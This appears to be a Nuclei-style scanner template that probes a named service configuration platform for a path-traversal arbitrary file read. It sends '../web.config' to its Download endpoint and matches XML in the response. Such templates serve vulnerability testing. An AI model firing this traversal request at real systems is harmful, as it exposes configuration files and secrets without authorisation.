id: smgw-Download-lfi
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 生命港湾服务配置工具平台 Download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取配置文件等等，导致网站处于极度不安全状态。
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/api/File/Download?file=../web.config"
      
    matchers:
      - type: word
        part: body
        words:
          - '<?xml'
